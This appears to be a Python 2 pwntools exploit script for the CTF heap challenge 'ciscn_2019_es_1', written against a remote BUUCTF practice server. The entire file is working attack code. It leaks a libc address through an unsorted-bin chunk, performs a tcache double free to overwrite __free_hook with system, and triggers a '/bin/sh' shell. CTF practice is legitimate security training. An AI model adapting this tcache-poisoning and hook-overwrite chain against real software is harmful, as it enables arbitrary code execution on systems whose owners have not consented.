#!/usr/bin/python2
from PwnContext.core import *
binary = './ciscn_2019_es_1'
debug_libc = './libc-2.27.so'
elf = ELF(binary)
libc = ELF(debug_libc)
local = 1



if local == 1 :
    p = remote("node3.buuoj.cn","29256")
else:
    ctx.binary = binary
    ctx.remote_libc = debug_libc
    ctx.debug_remote_libc = True
    p = ctx.start()



def add(size,name,compary):
    p.sendlineafter('choice:','1')
    p.sendlineafter('name',str(size))
    p.sendlineafter('name:',name)
    p.sendlineafter('call:',compary)

def show(idx):
    p.sendlineafter('choice:','2')
    p.sendlineafter('index:',str(idx))

def call(idx):
    p.sendlineafter('choice:','3')
    p.sendlineafter('index:',str(idx))



def exp():


    add(0x410,'A','137')#0
    add(0x28,'B','139')#1
    add(0x68,'/bin/sh\x00','139')#2
    add(0x30,'C','138')#3
    call(0)
    show(0)
    libcbase=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-96-0x10-libc.sym['__malloc_hook']
    print "libc: " + hex(libcbase)
    malloc_hook=libcbase+libc.sym['__malloc_hook']
    one_gadget=libcbase+0x4f322
    free_hook=libcbase+libc.sym['__free_hook']
    system=libcbase+libc.sym['system']
    call(1)
    call(1)
    add(0x28,p64(free_hook),'141')   #tcahe dup
    add(0x28,'111','142')
    add(0x28,p64(system),'143')
    call(2)
    p.interactive()

if __name__=="__main__":
    exp()
